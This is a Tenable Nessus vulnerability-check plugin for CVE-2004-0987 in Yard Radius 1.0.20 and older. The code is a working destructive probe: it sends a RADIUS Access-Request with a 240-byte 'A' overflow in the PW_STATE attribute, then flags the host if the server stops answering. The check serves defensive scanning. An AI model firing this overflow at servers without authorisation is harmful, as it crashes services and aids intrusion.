#
# (C) Tenable Network Security
#



if(description)
{
 script_id(15892);
 script_bugtraq_id(11753);
 script_cve_id("CVE-2004-0987");
 script_version ("$Revision: 1.2 $");
 
 name["english"] = "Yard Radius Remote Buffer Overflow Vulnerability";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote radius server seems to be running Yard Radius 1.0.20 or older.

This radius server is vulnerable to a buffer overflow that
allows an attacker to gain a shell on this host.

*** Note that this check made the remote radius server crash

Solution : Upgrade to the latest version of this software
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Overflows yardradius";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "Gain a shell remotely";
 script_family(english:family["english"]);
 exit(0);
}


port = 1812;
if ( ! get_port_state(port) ) exit(0);

soc = open_sock_udp(port);

name = "Nessus";

coolreq = raw_string (0x01,      # Code: Access Request (1)
		  0x12,      # Packet identifier: 0x12 (18)
		  0x00,0x1C,      # Length: 58
		  # Authenticator :
		  0x20,0x20,0x20,0x20,0x20,0x20,0x31,0x31,0x30,0x31,0x39,0x31,0x32,0x38,0x34,0x32,
		  0x01,      # Attribute code : 1 (User-Name)
		  0x08,      # Att length
		  0x4E,0x65,0x73,0x73,0x75,0x73);

send(socket:soc, data:coolreq);
r = recv(socket:soc, length:4096);
if (!r) exit (0);

menu = "MENU=" + crap(data:"A", length:240);

req = raw_string (# Authenticator :
		  0x20,0x20,0x20,0x20,0x20,0x20,0x31,0x31,0x30,0x31,0x39,0x31,0x32,0x38,0x34,0x30,
		  0x01,      # Attribute code : 1 (User-Name)
		  (strlen(name)+2) % 256       # Attibute length
		  )
		  + name +
      raw_string (0x18,      # Attribute code : PW_STATE (24)
		  (strlen(menu)+2) % 256      # Attribute length
		  )
		  + menu;

len_hi = (strlen(req) + 4)/256;
len_lo = (strlen(req) + 4)%256;

req = raw_string (0x01,      # Code: Access Request (1)
		  0x12,      # Packet identifier: 0x12 (18)
		  len_hi,len_lo) + req;

send(socket:soc, data:req);
r = recv(socket:soc, length:4096);

send(socket:soc, data:coolreq);
r = recv(socket:soc, length:4096);
if (!r) security_hole(port);
